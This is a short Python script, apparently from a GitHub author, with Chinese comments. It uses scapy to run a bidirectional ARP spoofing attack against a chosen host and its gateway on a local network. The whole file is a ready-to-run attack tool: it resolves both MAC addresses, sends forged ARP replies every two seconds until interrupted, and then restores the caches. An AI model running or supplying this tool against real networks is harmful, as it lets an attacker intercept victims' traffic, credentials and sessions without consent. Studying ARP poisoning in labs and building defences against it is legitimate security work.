"""
by huocai
github:https://www.github.com/huocai250
"""
import sys
import time
from scapy.all import *
from optparse import OptionParser

def restore_target(gateway_mac,gateway_ip,target_mac,target_ip):
    '''
    ARP缓冲表恢复
    '''
    print("[*] 恢复ARP缓冲...")
    #构造ARP包
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))


def attack_target(gateway_mac,gateway_ip,target_mac,target_ip):
    '''
    进行双向欺诈
    '''
    #构建ARP包

    # 欺骗网关
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    #欺骗目标主机
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] 正在ARP欺骗中ing...\n[*] Ctrl+C 停止ARP欺骗")

    while True:
        try:
            #循环发送ARP包
            send(poison_target)
            send(poison_gateway)
            #停顿
            time.sleep(2)
            #捕捉键盘中断
        except KeyboardInterrupt:
            #进行ARP缓冲恢复
            restore_target(gateway_mac,gateway_ip,target_mac,target_ip)
            break
    print("[*] ARP欺骗结束")

    return

def main():
    #使用提示
    usage = 'sudo python3 arpspoof.py [-i interface] [-g gateway] host\nby huocai\n github:https://www.github.com/huocai250'
    parser = OptionParser(usage)

    parser.add_option('-i',dest='interface',type='string',help='网卡')
    parser.add_option('-g', dest='gateway', type='string', help='网关')

    #解析命令行
    (options,args) = parser.parse_args()
    if len(args) != 1 or options.interface is None or options.gateway is None:
        #输出使用提示
        parser.print_help()
        sys.exit(0)

    #网卡
    interface = options.interface
    #网关
    gateway_ip = options.gateway
    #目标
    target_ip = args[0]
    #设置网卡
    conf.iface = interface
    #关闭提示信息
    conf.verb = 0

    print("[*] 网卡：%s"%interface)
    #获取网关MAC
    gateway_mac = getmacbyip(gateway_ip)

    if gateway_mac is None:
        print("[!] 获取网关MAC失败，EXITING")
        sys.exit(0)
    else:
        print("[*] 网关：%s MAC：%s"%(gateway_ip,gateway_mac))

    #获取目标主机MAC
    target_mac = getmacbyip(target_ip)

    if target_mac is None:
        print("[!] 获取目标主机MAC失败，EXITING")
        sys.exit(0)
    else:
        print("[*] 目标主机：%s MAC：%s"%(target_ip,target_mac))

    #进行欺骗
    attack_target(gateway_mac,gateway_ip,target_mac,target_ip)


if __name__ == "__main__":
    main()
